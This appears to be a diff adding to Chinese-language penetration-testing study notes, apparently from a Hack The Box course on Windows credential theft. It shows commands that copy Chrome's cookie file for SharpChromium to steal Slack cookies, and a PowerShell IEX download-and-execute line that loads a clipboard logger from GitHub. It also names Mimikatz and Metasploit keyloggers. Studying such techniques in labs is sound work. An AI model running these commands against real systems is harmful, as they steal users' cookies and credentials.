@@ -253,3 +253,19 @@ SharpChromium 正在 %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies 中�
 但实际文件位于 %LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies。通过以下命令，我们将文件复制到 SharpChromium 期望的位置。
 C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
 C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
+
+***
+剪贴板
+C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
+C:\htb> Invoke-ClipboardLogger                监控剪贴板中的条目
+        https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1
+也可以使用 Mimikatz 或键盘记录器等工具获取用户凭证。像 Metasploit 这样的 C2 框架包含内置的键盘记录功能
+
+***
+典型的服务器角色和服务包括:
+文件和打印服务器
+Web 和数据库服务器
+证书颁发机构服务器
+源代码管理服务器
+备份服务器
+
